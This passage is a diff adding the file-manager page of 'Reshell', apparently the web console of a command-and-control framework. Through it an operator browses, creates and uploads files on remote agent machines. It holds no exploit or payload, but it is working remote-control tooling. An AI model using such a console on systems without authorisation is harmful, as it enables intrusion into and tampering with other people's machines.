@@ -1,0 +1,1252 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>文件管理 - Reshell</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/static/bootstrap.min.css">
+    <link rel="stylesheet" href="/static/ruoyi.css">
+    <style>
+        .file-mgr-surface { margin-top: 4px; }
+        .file-mgr-layout {
+            display: flex;
+            gap: 12px;
+            align-items: stretch;
+            min-height: calc(100vh - 148px);
+        }
+        .file-mgr-tree-panel {
+            width: 280px;
+            flex-shrink: 0;
+            border: 1px solid #e8e8e8;
+            border-radius: 4px;
+            background: #fff;
+            display: flex;
+            flex-direction: column;
+            max-height: calc(100vh - 148px);
+        }
+        .file-mgr-tree-head {
+            padding: 10px 12px;
+            font-weight: 600;
+            border-bottom: 1px solid #f0f0f0;
+            color: #000;
+        }
+        .file-mgr-tree-search {
+            display: flex;
+            gap: 6px;
+            padding: 8px;
+            border-bottom: 1px solid #f0f0f0;
+            align-items: center;
+        }
+        .file-mgr-tree-search input {
+            flex: 1;
+            min-width: 0;
+            padding: 4px 8px;
+            border: 1px solid #d9d9d9;
+            border-radius: 4px;
+            font-size: 13px;
+            color: #000;
+            background: #fff;
+        }
+        .file-mgr-tree-search .btn-icon {
+            padding: 4px 10px;
+            cursor: pointer;
+            font-size: 14px;
+            line-height: 1.4;
+        }
+        .file-mgr-tree-scroll {
+            flex: 1;
+            overflow: auto;
+            padding: 8px 10px;
+            color: #000;
+            font-size: 13px;
+        }
+        .file-mgr-root {
+            font-size: 12px;
+            color: #333;
+            margin-bottom: 8px;
+            word-break: break-all;
+            font-weight: 500;
+        }
+        .file-mgr-main {
+            flex: 1;
+            min-width: 0;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid #e8e8e8;
+            border-radius: 4px;
+            background: #fff;
+            max-height: calc(100vh - 148px);
+        }
+        .file-mgr-toolbar {
+            padding: 10px 12px;
+            border-bottom: 1px solid #f0f0f0;
+        }
+        .file-mgr-toolbar-row {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 8px;
+        }
+        .file-mgr-toolbar-row + .file-mgr-toolbar-row { margin-top: 8px; }
+        .file-mgr-icon-btns {
+            display: flex;
+            gap: 4px;
+            flex-shrink: 0;
+        }
+        .file-mgr-icon-btns button {
+            width: 32px;
+            height: 32px;
+            padding: 0;
+            cursor: pointer;
+            font-size: 15px;
+            line-height: 1;
+        }
+        .file-mgr-path-wrap {
+            flex: 1;
+            display: flex;
+            gap: 6px;
+            min-width: 120px;
+            align-items: center;
+        }
+        .file-mgr-path-wrap .form-control { min-width: 0; }
+        .file-mgr-actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            justify-content: flex-end;
+        }
+        .file-mgr-actions .btn { font-size: 12px; }
+        .file-mgr-cwd-hint {
+            font-size: 12px;
+            color: #333;
+        }
+        .file-mgr-cwd-hint code {
+            color: #000;
+            background: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+        .file-mgr-table-wrap {
+            flex: 1;
+            overflow: auto;
+            min-height: 160px;
+        }
+        .file-mgr-table-wrap .table { margin-bottom: 0; color: #000; }
+        .file-mgr-table-wrap .table thead th {
+            position: sticky;
+            top: 0;
+            z-index: 1;
+            background: #fafafa;
+            color: #000;
+            font-weight: 600;
+            border-bottom: 2px solid #e8e8e8;
+            white-space: nowrap;
+        }
+        .file-mgr-table-wrap tbody tr:hover { background: #f9f9f9; }
+        .file-mgr-table-wrap .name-cell { font-weight: 500; }
+        .file-mgr-pagination {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 12px;
+            border-top: 1px solid #f0f0f0;
+            font-size: 13px;
+            color: #000;
+        }
+        .file-mgr-page-btns { display: flex; flex-wrap: wrap; gap: 4px; align-items: center; }
+        .file-mgr-page-btns .btn { min-width: 2rem; }
+        .file-mgr-page-jump input { width: 3.5rem; display: inline-block; margin: 0 4px; }
+        .file-mgr-modal .modal-content { color: #000; }
+        .file-mgr-modal .form-control, .file-mgr-modal .form-control:focus { color: #212529; background: #fff; }
+        .file-mgr-upload-table { font-size: 13px; }
+        .file-mgr-upload-table td { vertical-align: middle; color: #000; }
+        /* Bootstrap CSS 兜底：当前项目 bootstrap.min.css 为精简占位版，未包含 modal 样式 */
+        .modal { position: fixed; top: 0; left: 0; z-index: 1055; width: 100%; height: 100%; overflow-x: hidden; overflow-y: auto; outline: 0; display: none; }
+        .modal.show { display: block; }
+        .modal-dialog { position: relative; width: auto; margin: 1.75rem auto; pointer-events: none; max-width: 500px; }
+        .modal-lg { max-width: 800px; }
+        .modal-dialog-scrollable { height: calc(100% - 3.5rem); }
+        .modal-dialog-scrollable .modal-content { max-height: 100%; overflow: hidden; }
+        .modal-dialog-scrollable .modal-body { overflow-y: auto; }
+        .modal-content { position: relative; display: flex; flex-direction: column; width: 100%; pointer-events: auto; background-color: #fff; border: 1px solid rgba(0, 0, 0, .2); border-radius: .3rem; outline: 0; }
+        .modal-header, .modal-footer { display: flex; align-items: center; justify-content: space-between; padding: .75rem 1rem; border-bottom: 1px solid #dee2e6; }
+        .modal-footer { border-top: 1px solid #dee2e6; border-bottom: 0; gap: .5rem; }
+        .modal-body { position: relative; flex: 1 1 auto; padding: 1rem; }
+        .modal-backdrop { position: fixed; top: 0; left: 0; z-index: 1050; width: 100vw; height: 100vh; background-color: #000; }
+        .modal-backdrop.show { opacity: .5; }
+    </style>
+</head>
+<body class="page-files">
+<div class="layout-wrapper">
+    <div id="op-toast" style="display:none; position: fixed; top: 18px; right: 18px; z-index: 3000; min-width: 260px; max-width: 420px; padding: 10px 14px; border-radius: 6px; color: #fff; font-size: 13px; box-shadow: 0 8px 24px rgba(0,0,0,.2);"></div>
+    <aside class="layout-sidebar">
+        <div class="logo">
+            <span>Reshell</span>
+        </div>
+        <ul class="layout-menu">
+            <li><a href="/dashboard">仪表盘</a></li>
+            <li><a href="/listeners">监听管理</a></li>
+            <li><a href="/clients" class="active">客户端管理</a></li>
+            <li><a href="/payloads">载荷生成</a></li>
+        </ul>
+    </aside>
+
+    <div class="layout-main">
+        <header class="layout-header">
+            <div class="layout-header-title">文件管理 - 客户端 #{{.ClientID}}</div>
+            <div class="layout-header-actions">
+                <a href="/client/{{.ClientID}}" class="btn btn-outline-secondary btn-sm">返回设备详情</a>
+                <button class="btn btn-outline-danger btn-sm" onclick="logout()">退出登录</button>
+            </div>
+        </header>
+
+        <main class="layout-content file-mgr-surface">
+            <div class="file-mgr-layout">
+                <aside class="file-mgr-tree-panel">
+                    <div class="file-mgr-tree-head">文件树</div>
+                    <div class="file-mgr-tree-search">
+                        <input type="text" id="tree-filter" placeholder="搜索" autocomplete="off" title="按名称筛选树节点">
+                        <button type="button" class="btn-icon" onclick="applyTreeFilter()" title="筛选">🔍</button>
+                        <button type="button" class="btn-icon" onclick="loadDirectoryTree()" title="刷新根目录">↻</button>
+                    </div>
+                    <div class="file-mgr-tree-scroll">
+                        <div class="file-mgr-root">{{.ClientTreeLabel}}</div>
+                        <div id="dir-tree" class="small">加载中…</div>
+                    </div>
+                </aside>
+
+                <section class="file-mgr-main">
+                    <div class="file-mgr-toolbar">
+                        <div class="file-mgr-toolbar-row">
+                            <div class="file-mgr-icon-btns">
+                                <button type="button" title="根 / 重扫树" onclick="goTreeRoot()">⌂</button>
+                                <button type="button" title="上级目录" onclick="goUp()">↑</button>
+                                <button type="button" title="刷新列表" onclick="refreshFiles()">↻</button>
+                            </div>
+                            <div class="file-mgr-path-wrap input-group input-group-sm">
+                                <input type="text" class="form-control" id="current-path" placeholder="当前路径，可编辑后打开">
+                                <button class="btn btn-primary btn-sm" type="button" onclick="changePath()">打开</button>
+                            </div>
+                            <div class="file-mgr-actions">
+                                <button type="button" class="btn btn-primary btn-sm" onclick="openMkdirModal()">新建文件夹</button>
+                                <button type="button" class="btn btn-primary btn-sm" onclick="openNewFileModal()">新建文件</button>
+                                <button type="button" class="btn btn-primary btn-sm" onclick="openUploadModal()">上传文件</button>
+                            </div>
+                        </div>
+                        <div class="file-mgr-toolbar-row file-mgr-cwd-hint">
+                            <span>进程工作目录：</span>
+                            <code id="agent-working-dir" class="user-select-all">{{if .AgentWorkingDir}}{{.AgentWorkingDir}}{{else}}（尚未上报）{{end}}</code>
+                            <button type="button" class="btn btn-link btn-sm p-0" onclick="refreshAgentWorkingDir()">同步</button>
+                            <button type="button" class="btn btn-link btn-sm p-0" onclick="openAgentWorkingDirectory()">在列表中打开</button>
+                        </div>
+                    </div>
+
+                    <div class="file-mgr-table-wrap">
+                        <table class="table table-sm table-bordered mb-0">
+                            <thead>
+                            <tr>
+                                <th>名称</th>
+                                <th>时间</th>
+                                <th>权限</th>
+                                <th>大小</th>
+                                <th>操作</th>
+                            </tr>
+                            </thead>
+                            <tbody id="file-list">
+                            <tr>
+                                <td colspan="5" class="text-center text-muted">请在左侧展开目录或在此输入路径后点「打开」。</td>
+                            </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div id="file-pagination" class="file-mgr-pagination" style="display:none;">
+                        <span id="file-pagination-total">共 0 条</span>
+                        <div class="file-mgr-page-btns" id="file-pagination-btns"></div>
+                        <label class="mb-0 d-flex align-items-center gap-1">
+                            <select id="file-page-size" class="form-select form-select-sm" style="width:auto;">
+                                <option value="20">20 条/页</option>
+                                <option value="50">50 条/页</option>
+                                <option value="100" selected>100 条/页</option>
+                                <option value="200">200 条/页</option>
+                            </select>
+                        </label>
+                        <span class="file-mgr-page-jump d-flex align-items-center">
+                            跳至 <input type="number" class="form-control form-control-sm" id="file-page-jump" min="1" value="1"> 页
+                            <button type="button" class="btn btn-sm btn-outline-secondary ms-1" onclick="jumpToPageInput()">跳转</button>
+                        </span>
+                    </div>
+                </section>
+            </div>
+        </main>
+    </div>
+</div>
+
+<!-- 新建文件夹 -->
+<div class="modal fade file-mgr-modal" id="modalMkdir" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">新建文件夹</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="关闭"></button>
+            </div>
+            <div class="modal-body">
+                <label class="form-label mb-2"><span class="text-danger">*</span> 文件夹名</label>
+                <input type="text" class="form-control" id="modal-mkdir-name" placeholder="请输入内容" autocomplete="off">
+                <div class="form-text small text-muted">在当前目录下创建；勿含 \ 或 /</div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">取消</button>
+                <button type="button" class="btn btn-primary" onclick="submitMkdirModal()">确定</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 新建文件 -->
+<div class="modal fade file-mgr-modal" id="modalNewFile" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">新建文件</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="关闭"></button>
+            </div>
+            <div class="modal-body">
+                <label class="form-label mb-2"><span class="text-danger">*</span> 文件名</label>
+                <input type="text" class="form-control" id="modal-newfile-name" placeholder="请输入内容" autocomplete="off">
+                <div class="form-text small text-muted">在当前目录下创建空文件；勿含 \ 或 /</div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">取消</button>
+                <button type="button" class="btn btn-primary" onclick="submitNewFileModal()">确定</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- 上传文件（二级弹窗：选文件 → 队列 → 走 Base64 上传协议） -->
+<div class="modal fade file-mgr-modal" id="modalUpload" tabindex="-1" aria-hidden="true">
+    <div class="modal-dialog modal-lg modal-dialog-scrollable">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="modal-upload-title">上传文件</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="关闭"></button>
+            </div>
+            <div class="modal-body">
+                <div class="alert alert-info py-2 small mb-2">单个文件不超过 500MB，最多只能同时上传 6 个文件</div>
+                <div class="d-flex justify-content-end my-2">
+                    <button type="button" class="btn btn-primary btn-sm" onclick="document.getElementById('upload-file-input').click()">选择文件</button>
+                    <input type="file" id="upload-file-input" multiple hidden>
+                </div>
+                <div class="table-responsive border rounded" style="max-height: 320px;">
+                    <table class="table table-sm table-bordered mb-0 file-mgr-upload-table">
+                        <thead class="table-light">
+                        <tr>
+                            <th style="width:56px;">缩略</th>
+                            <th>文件名</th>
+                            <th style="width:100px;">文件大小</th>
+                            <th style="width:100px;">状态</th>
+                            <th style="width:72px;">操作</th>
+                        </tr>
+                        </thead>
+                        <tbody id="upload-queue-body">
+                        <tr><td colspan="5" class="text-center text-muted py-3">请先点击「选择文件」</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">关闭</button>
+                <button type="button" class="btn btn-primary" id="btn-start-upload" disabled onclick="startUploadQueue()">开始上传</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="/static/bootstrap.bundle.min.js"></script>
+<script>
+    const clientId = '{{.ClientID}}';
+    const MAX_UPLOAD_FILES = 6;
+    const MAX_UPLOAD_BYTES = 500 * 1024 * 1024;
+    /** 须与 Agent / server fileTransferChunkBytes 一致 */
+    const TRANSFER_CHUNK_BYTES = 256 * 1024;
+    const NETWORK_MAX_RETRIES = 8;
+    const NETWORK_BASE_DELAY_MS = 600;
+    const POLL_CHUNK_MAX_ATTEMPTS = 200;
+    const POLL_CHUNK_INTERVAL_MS = 800;
+    let currentPath = '';
+    let treeData = [];
+    let treeChildrenCache = {};
+    let allFilesList = [];
+    let fileListPage = 1;
+    let fileListPageSize = 100;
+    let uploadQueue = [];
+    let uploadQueueSeq = 0;
+    let uploadInProgress = false;
+    let opToastTimer = null;
+
+    function logout() {
+        localStorage.removeItem('c2_token');
+        document.cookie = 'c2_token=; Max-Age=0; path=/';
+        window.location.href = '/login';
+    }
+
+    function getToken() {
+        return localStorage.getItem('c2_token') || '';
+    }
+
+    function escapeHtml(s) {
+        if (s == null || s === undefined) return '';
+        return String(s)
+            .replace(/&/g, '&amp;')
+            .replace(/</g, '&lt;')
+            .replace(/>/g, '&gt;')
+            .replace(/"/g, '&quot;');
+    }
+
+    function showOpToast(kind, msg) {
+        const el = document.getElementById('op-toast');
+        if (!el) return;
+        const text = msg || '';
+        const ok = kind === 'success';
+        const warn = kind === 'warning';
+        el.style.background = ok ? '#16a34a' : (warn ? '#d97706' : '#dc2626');
+        el.innerHTML = (ok ? '✅ ' : (warn ? '⚠️ ' : '❌ ')) + escapeHtml(text);
+        el.style.display = 'block';
+        if (opToastTimer) clearTimeout(opToastTimer);
+        opToastTimer = setTimeout(function() {
+            el.style.display = 'none';
+        }, 2600);
+    }
+
+    async function fetchJSON(url, opts = {}) {
+        opts.headers = Object.assign({
+            'Authorization': 'Bearer ' + getToken(),
+            'Content-Type': 'application/json'
+        }, opts.headers || {});
+        const res = await fetch(url, opts);
+        if (res.status === 401) {
+            window.location.href = '/login';
+            return;
+        }
+        return res.json();
+    }
+
+    function pathSep(base) {
+        const b = String(base || '');
+        if (b.indexOf('/') >= 0 && b.indexOf('\\') < 0) return '/';
+        return '\\';
+    }
+
+    function joinRemotePath(base, name) {
+        if (!base) return name;
+        const sep = pathSep(base);
+        const b = String(base).replace(/[\\/]+$/, '');
+        return b + sep + name;
+    }
+
+    function remoteParentPath(p) {
+        if (p == null || p === '') return '';
+        const norm = String(p).replace(/\\/g, '/');
+        const trimmed = norm.replace(/\/+$/, '');
+        if (trimmed === '' || trimmed === '/') return '';
+        const i = trimmed.lastIndexOf('/');
+        if (i < 0) {
+            const bs = String(p).replace(/\/+/g, '\\').replace(/\\+$/, '');
+            const j = bs.lastIndexOf('\\');
+            if (j <= 0) return '';
+            if (/^[a-zA-Z]:$/i.test(bs.slice(0, j + 1))) return bs.slice(0, 3);
+            if (j === 2 && bs[1] === ':') return bs.slice(0, 3);
+            return bs.slice(0, j);
+        }
+        if (i === 0) return '/';
+        if (trimmed[1] === ':') return trimmed.slice(0, i).replace(/\//g, '\\');
+        return trimmed.slice(0, i);
+    }
+
+    function fileModeStr(isDir) {
+        return isDir ? 'd---------' : '-rw-r--r--';
+    }
+
+    function showFileListPlaceholder() {
+        allFilesList = [];
+        fileListPage = 1;
+        const tbody = document.getElementById('file-list');
+        tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">请在左侧展开目录或在此输入路径后点「打开」。</td></tr>';
+        document.getElementById('file-pagination').style.display = 'none';
+    }
+
+    function sortTreeNodesForDisplay(nodes) {
+        if (!Array.isArray(nodes)) return [];
+        return nodes.slice().sort((a, b) => {
+            const ad = !!(a && (a.is_dir || a.type === 'directory'));
+            const bd = !!(b && (b.is_dir || b.type === 'directory'));
+            if (ad !== bd) return ad ? -1 : 1;
+            const an = (a && a.name) ? String(a.name) : '';
+            const bn = (b && b.name) ? String(b.name) : '';
+            return an.localeCompare(bn, undefined, { sensitivity: 'base' });
+        });
+    }
+
+    async function refreshAgentWorkingDir() {
+        const el = document.getElementById('agent-working-dir');
+        if (!el) return;
+        const data = await fetchJSON('/api/clients/' + clientId);
+        if (!data) return;
+        if (data.working_directory) {
+            el.textContent = data.working_directory;
+        } else {
+            el.textContent = '（尚未上报）';
+        }
+    }
+
+    function openAgentWorkingDirectory() {
+        const el = document.getElementById('agent-working-dir');
+        if (!el) return;
+        const t = el.textContent.trim();
+        if (!t || t.indexOf('（') === 0) {
+            alert('暂无有效目录，请等待客户端上线并同步。');
+            return;
+        }
+        enterDirectoryByPath(t);
+    }
+
+    async function listFiles(path) {
+        const p = path !== undefined && path !== null ? path : currentPath;
+        if (!String(p || '').trim()) {
+            showFileListPlaceholder();
+            return;
+        }
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/list', {
+            method: 'POST',
+            body: JSON.stringify({path: p})
+        });
+        if (data && data.command_id) {
+            pollCommandResult(data.command_id, displayFiles);
+        } else if (data && data.error) {
+            showError(String(data.error));
+        }
+    }
+
+    async function loadDirectoryTree(path = '.', depth = 1) {
+        treeChildrenCache = {};
+        const treeEl = document.getElementById('dir-tree');
+        treeEl.innerHTML = '<div class="text-muted small">正在请求目录树…</div>';
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/tree', {
+            method: 'POST',
+            body: JSON.stringify({path: path, depth: depth})
+        });
+        if (data && data.command_id) {
+            pollCommandResult(data.command_id, displayDirectoryTree, { errorTarget: 'tree' });
+        } else {
+            showTreeError(data && data.error ? String(data.error) : '无法请求目录树（请检查客户端连接）');
+        }
+    }
+
+    function sleepMs(ms) {
+        return new Promise(function(r) { setTimeout(r, ms); });
+    }
+
+    async function withExponentialBackoff(operation) {
+        let lastErr;
+        for (let attempt = 0; attempt < NETWORK_MAX_RETRIES; attempt++) {
+            try {
+                return await operation();
+            } catch (e) {
+                lastErr = e;
+                if (attempt < NETWORK_MAX_RETRIES - 1) {
+                    await sleepMs(Math.round(NETWORK_BASE_DELAY_MS * Math.pow(1.6, attempt)));
+                }
+            }
+        }
+        throw lastErr;
+    }
+
+    function pollCommandResultAsync(cmdId, opt) {
+        opt = opt || {};
+        const maxAttempts = opt.maxAttempts != null ? opt.maxAttempts : 120;
+        const intervalMs = opt.intervalMs != null ? opt.intervalMs : 1000;
+        return new Promise((resolve, reject) => {
+            let attempts = 0;
+            const tick = async () => {
+                if (attempts >= maxAttempts) {
+                    reject(new Error('命令执行超时'));
+                    return;
+                }
+                attempts++;
+                try {
+                    const data = await fetchJSON('/api/commands/' + cmdId + '/result');
+                    if (!data) {
+                        setTimeout(tick, intervalMs);
+                        return;
+                    }
+                    if (data.status === 'completed') {
+                        resolve(data.result);
+                        return;
+                    }
+                    if (data.status === 'failed') {
+                        reject(new Error(data.result || '命令失败'));
+                        return;
+                    }
+                    setTimeout(tick, intervalMs);
+                } catch (e) {
+                    setTimeout(tick, intervalMs);
+                }
+            };
+            setTimeout(tick, intervalMs);
+        });
+    }
+
+    function fileToBase64(file) {
+        return new Promise((resolve, reject) => {
+            const r = new FileReader();
+            r.onload = function() {
+                const s = r.result;
+                const i = typeof s === 'string' ? s.indexOf(',') : -1;
+                resolve(i >= 0 ? s.slice(i + 1) : s);
+            };
+            r.onerror = function() { reject(new Error('读取文件失败')); };
+            r.readAsDataURL(file);
+        });
+    }
+
+    function requireCurrentDir() {
+        if (!currentPath || !String(currentPath).trim()) {
+            alert('请先打开一个目录（左侧树或路径栏）。');
+            return false;
+        }
+        return true;
+    }
+
+    function openMkdirModal() {
+        if (!requireCurrentDir()) return;
+        document.getElementById('modal-mkdir-name').value = '';
+        bootstrap.Modal.getOrCreateInstance(document.getElementById('modalMkdir')).show();
+    }
+
+    async function submitMkdirModal() {
+        if (!requireCurrentDir()) return;
+        const name = document.getElementById('modal-mkdir-name').value.trim();
+        if (!name) {
+            alert('请输入文件夹名');
+            return;
+        }
+        if (/[\\/]/.test(name)) {
+            alert('名称中不能含 \\ 或 /');
+            return;
+        }
+        const path = joinRemotePath(currentPath, name);
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/mkdir', {
+            method: 'POST',
+            body: JSON.stringify({ path: path })
+        });
+        if (data && data.command_id) {
+            pollCommandResult(data.command_id, function() {
+                bootstrap.Modal.getInstance(document.getElementById('modalMkdir')).hide();
+                document.getElementById('modal-mkdir-name').value = '';
+                showOpToast('success', '文件夹创建成功');
+                refreshFiles();
+            });
+        } else if (data && data.error) {
+            showOpToast('error', String(data.error));
+        }
+    }
+
+    function openNewFileModal() {
+        if (!requireCurrentDir()) return;
+        document.getElementById('modal-newfile-name').value = '';
+        bootstrap.Modal.getOrCreateInstance(document.getElementById('modalNewFile')).show();
+    }
+
+    async function submitNewFileModal() {
+        if (!requireCurrentDir()) return;
+        const name = document.getElementById('modal-newfile-name').value.trim();
+        if (!name) {
+            alert('请输入文件名');
+            return;
+        }
+        if (/[\\/]/.test(name)) {
+            alert('名称中不能含 \\ 或 /');
+            return;
+        }
+        const remotePath = joinRemotePath(currentPath, name);
+        const data = await fetchJSON('/api/clients/' + clientId + '/files/upload', {
+            method: 'POST',
+            body: JSON.stringify({ remote_path: remotePath, content: '' })
+        });
+        if (data && data.command_id) {
+            pollCommandResult(data.command_id, function() {
+                bootstrap.Modal.getInstance(document.getElementById('modalNewFile')).hide();
+                document.getElementById('modal-newfile-name').value = '';
+                showOpToast('success', '文件创建成功');
+                refreshFiles();
+            });
+        } else if (data && data.error) {
+            showOpToast('error', String(data.error));
+        }
+    }
+
+    function openUploadModal() {
+        if (!requireCurrentDir()) return;
+        uploadQueue = [];
+        uploadInProgress = false;
+        renderUploadQueue();
+        document.getElementById('modal-upload-title').textContent = '上传文件';
+        bootstrap.Modal.getOrCreateInstance(document.getElementById('modalUpload')).show();
+    }
+
+    function removeFromUploadQueue(id) {
+        if (uploadInProgress) return;
+        uploadQueue = uploadQueue.filter(function(x) { return x.id !== id; });
+        renderUploadQueue();
+    }
+
+    function renderUploadQueue() {
+        const tbody = document.getElementById('upload-queue-body');
+        const title = document.getElementById('modal-upload-title');
+        title.textContent = uploadQueue.length ? ('上传 ' + uploadQueue.length + ' 个文件') : '上传文件';
+        const pending = uploadQueue.some(function(x) { return x.status === 'pending'; });
+        document.getElementById('btn-start-upload').disabled = uploadInProgress || !pending;
+        if (!uploadQueue.length) {
+            tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted py-3">请先点击「选择文件」</td></tr>';
+            return;
+        }
+        tbody.innerHTML = '';
+        uploadQueue.forEach(function(item) {
+            const tr = document.createElement('tr');
+            const st = item.status || 'pending';
+            const stHtml = st === '失败' && item.error
+                ? '<span class="text-danger" title="' + escapeHtml(item.error) + '">失败</span>'
+                : escapeHtml(st);
+            tr.innerHTML =
+                '<td class="text-center">📄</td>' +
+                '<td>' + escapeHtml(item.file.name) + '</td>' +
+                '<td>' + escapeHtml(formatSize(item.file.size)) + '</td>' +
+                '<td>' + stHtml + '</td>' +
+                '<td><button type="button" class="btn btn-sm btn-outline-danger"' +
+                (uploadInProgress ? ' disabled' : '') +
+                ' onclick="removeFromUploadQueue(' + item.id + ')">移除</button></td>';
+            tbody.appendChild(tr);
+        });
+    }
+
+    async function startUploadQueue() {
+        if (uploadInProgress || !uploadQueue.length) return;
+        const hasPending = uploadQueue.some(function(x) { return x.status === 'pending'; });
+        if (!hasPending) return;
+        uploadInProgress = true;
+        document.getElementById('btn-start-upload').disabled = true;
+        let anyOk = false;
+        for (let i = 0; i < uploadQueue.length; i++) {
+            const item = uploadQueue[i];
+            if (item.status !== 'pending') continue;
+            item.status = '上传中';
+            renderUploadQueue();
+            try {
+                const remotePath = joinRemotePath(currentPath, item.file.name);
+                if (item.file.size === 0) {
+                    await withExponentialBackoff(async function() {
+                        const data = await fetchJSON('/api/clients/' + clientId + '/files/upload', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                remote_path: remotePath,
+                                content: '',
+                                chunk_index: 0
+                            })
+                        });
+                        if (!data || !data.command_id) {
+                            throw new Error((data && data.error) ? String(data.error) : '请求失败');
+                        }
+                        await pollCommandResultAsync(data.command_id, {
+                            maxAttempts: POLL_CHUNK_MAX_ATTEMPTS,
+                            intervalMs: POLL_CHUNK_INTERVAL_MS
+                        });
+                    });
+                } else {
+                    let chunkIndex = 0;
+                    for (let offset = 0; offset < item.file.size; offset += TRANSFER_CHUNK_BYTES) {
+                        const end = Math.min(offset + TRANSFER_CHUNK_BYTES, item.file.size);
+                        const slice = item.file.slice(offset, end);
+                        const b64 = await fileToBase64(slice);
+                        await withExponentialBackoff(async function() {
+                            const data = await fetchJSON('/api/clients/' + clientId + '/files/upload', {
+                                method: 'POST',
+                                body: JSON.stringify({
+                                    remote_path: remotePath,
+                                    content: b64,
+                                    chunk_index: chunkIndex
+                                })
+                            });
+                            if (!data || !data.command_id) {
+                                throw new Error((data && data.error) ? String(data.error) : '请求失败');
+                            }
+                            await pollCommandResultAsync(data.command_id, {
+                                maxAttempts: POLL_CHUNK_MAX_ATTEMPTS,
+                                intervalMs: POLL_CHUNK_INTERVAL_MS
+                            });
+                        });
+                        chunkIndex++;
+                    }
+                }
+                item.status = '成功';
+                anyOk = true;
+            } catch (e) {
+                item.status = '失败';
+                item.error = (e && e.message) ? e.message : String(e);
+            }
+            renderUploadQueue();
+        }
+        uploadInProgress = false;
+        renderUploadQueue();
+        const failCount = uploadQueue.filter(function(x) { return x.status === '失败'; }).length;
+        const okCount = uploadQueue.filter(function(x) { return x.status === '成功'; }).length;
+        if (okCount > 0 && failCount === 0) {
+            showOpToast('success', '上传完成：成功 ' + okCount + ' 个');
+        } else if (okCount > 0 && failCount > 0) {
+            showOpToast('warning', '上传完成：成功 ' + okCount + ' 个，失败 ' + failCount + ' 个');
+        } else if (failCount > 0) {
+            showOpToast('error', '上传失败：共 ' + failCount + ' 个');
+        }
+        if (anyOk) refreshFiles();
+    }
+
+    async function pollCommandResult(cmdId, callback, opts) {
+        opts = opts || {};
+        const errorTarget = opts.errorTarget || 'table';
+        const maxAttempts = opts.maxAttempts != null ? opts.maxAttempts : 60;
+        const intervalMs = opts.intervalMs != null ? opts.intervalMs : 1000;
+        let attempts = 0;
+        const failMsg = (msg) => {
+            if (errorTarget === 'tree') showTreeError(msg);
+            else if (errorTarget !== 'silent') showError(msg);
+            if (errorTarget !== 'silent') showOpToast('error', msg);
+            if (typeof opts.onGiveUp === 'function') opts.onGiveUp();
+        };
+        const checkResult = async () => {
+            if (attempts >= maxAttempts) {
+                failMsg('命令执行超时');
+                return;
+            }
+            attempts++;
+            try {
+                const data = await fetchJSON('/api/commands/' + cmdId + '/result');
+                if (!data) {
+                    setTimeout(checkResult, intervalMs);
+                    return;
+                }
+                if (data.status === 'completed') {
+                    callback(data.result);
+                    return;
+                }
+                if (data.status === 'failed') {
+                    failMsg('命令执行失败: ' + (data.result || '未知错误'));
+                    return;
+                }
+                setTimeout(checkResult, intervalMs);
+            } catch (e) {
+                setTimeout(checkResult, intervalMs);
+            }
+        };
+        setTimeout(checkResult, intervalMs);
+    }
+
+    function displayFiles(filesJson) {
+        try {
+            const files = JSON.parse(filesJson);
+            allFilesList = Array.isArray(files) ? files : [];
+            allFilesList.sort((a, b) => {
+                const ad = !!(a && (a.is_dir || a.type === 'directory'));
+                const bd = !!(b && (b.is_dir || b.type === 'directory'));
+                if (ad !== bd) return ad ? -1 : 1;
+                return String(a.name || '').localeCompare(String(b.name || ''), undefined, { sensitivity: 'base' });
+            });
+        } catch (e) {
+            allFilesList = [];
+            showError('解析文件列表失败');
+            return;
+        }
+        fileListPage = 1;
+        const sel = document.getElementById('file-page-size');
+        if (sel) fileListPageSize = parseInt(sel.value, 10) || 100;
+        renderPagedFiles();
+    }
+
+    function renderPagedFiles() {
+        const tbody = document.getElementById('file-list');
+        tbody.innerHTML = '';
+        const total = allFilesList.length;
+        if (total === 0) {
+            tbody.innerHTML = '<tr><td colspan="5" class="text-center text-muted">目录为空</td></tr>';
+            document.getElementById('file-pagination').style.display = 'none';
+            return;
+        }
+        const pages = Math.max(1, Math.ceil(total / fileListPageSize));
+        if (fileListPage > pages) fileListPage = pages;
+        const start = (fileListPage - 1) * fileListPageSize;
+        const pageItems = allFilesList.slice(start, start + fileListPageSize);
+
+        pageItems.forEach(file => {
+            const isDir = !!file.is_dir || file.type === 'directory';
+            const itemPath = file.path || joinRemotePath(currentPath, file.name);
+            const tr = document.createElement('tr');
+            tr.style.cursor = 'pointer';
+            tr.title = isDir ? '双击进入文件夹' : '双击下载文件';
